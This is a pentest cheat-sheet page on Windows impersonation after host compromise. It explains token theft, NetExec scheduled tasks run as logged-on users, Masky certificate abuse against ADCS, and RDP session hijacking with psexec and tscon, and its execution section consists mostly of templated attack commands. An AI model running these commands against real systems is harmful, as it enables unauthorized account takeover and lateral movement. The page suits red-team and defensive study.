# Impersonation

A compromised host often has other users' sessions live on it. Their tokens can be impersonated, their RDP sessions hijacked, and their cached certificates reused — moving you to another identity without touching a password.

## Why It Works

Windows keeps a token for every active logon so processes can act on a user's behalf. SYSTEM can impersonate any of those tokens, which turns one compromised host with several logged-on users into several compromised identities.

## Prerequisites

* Local administrator or SYSTEM on the host
* A target user with an active session or cached credential on the host

## Execution

**Impersonate**

* Impersonate
  * `msf> use incognito impersonate_token <domain>\\<user>` [\[tool\]](https://docs.metasploit.com/)
  * `nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
    * `nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
      * **→ ACL**
      * **→ User + Pass**
  * `irs.exe list` [\[tool\]](https://github.com/zblurx/impersonate-rs)
    * `irs.exe exec -p <pid> -c <command>` [\[tool\]](https://github.com/zblurx/impersonate-rs)
* Impersonate with adcs
  * `masky - d <domain> -u <user> (-p <password> || -k || -H <hash>) -ca <certificate authority> <ip>` [\[tool\]](https://github.com/Z4kSec/Masky/tree/master)
    * **→ NTLM**
    * **→ Pass The Hash / Ticket / Certificate**
* Impersonate RDP Session
  * `psexec.exe -s -i cmd` [\[tool\]](https://learn.microsoft.com/fr-fr/sysinternals/downloads/psexec)
    * `query user` [\[tool\]](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query)
      * `tscon.exe <id> /dest:<session_name>` [\[tool\]](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon)
        * **→ RDP**

## Related

* [Credential Dumping](file:///9685693/host-access/credential-dumping.md) — the credential-based alternative
* [Pass-the-Certificate](file:///9685693/lateral-movement/pass-the-certificate.md) — reusing an impersonated certificate
